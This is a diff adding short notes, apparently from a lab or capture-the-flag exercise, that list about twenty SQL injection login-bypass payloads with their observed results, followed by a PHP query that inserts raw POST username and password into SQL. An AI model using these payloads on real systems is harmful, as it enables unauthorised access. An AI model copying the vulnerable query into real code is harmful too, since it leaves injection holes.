@@ -1,0 +1,41 @@
+SQL injection tries
+' OR 1=1; -- 
+"' OR 1=1; --
+"' OR '1=1'; --
+."' OR 1=1; --
+
+"' OR 1=1; -- -
+."' OR 1=1; -- -
+
+" OR 1=1; -- (no error, no return)
+" OR 1=1; -- -(no error no return)
+
+" OR true--(no error, no return)
+' OR true--
+' or true --
+
+' or "true'
+
+' or "='(Jess' answer)
+' or '"='
+' or "="
+' or '=' 
+name' or '= (invalid type of boolean)
+
+name' or '1=1
+name' or '1'='1
+
+
+$query=
+		"SELECT
+		authors.id as id,
+		authors.username as username,
+		authors.password as password,
+		authors.role as role
+		FROM
+		authors
+		WHERE
+		username='".$_POST['username']."'
+		AND
+		password='".$_POST['password']."'
+		LIMIT 1";
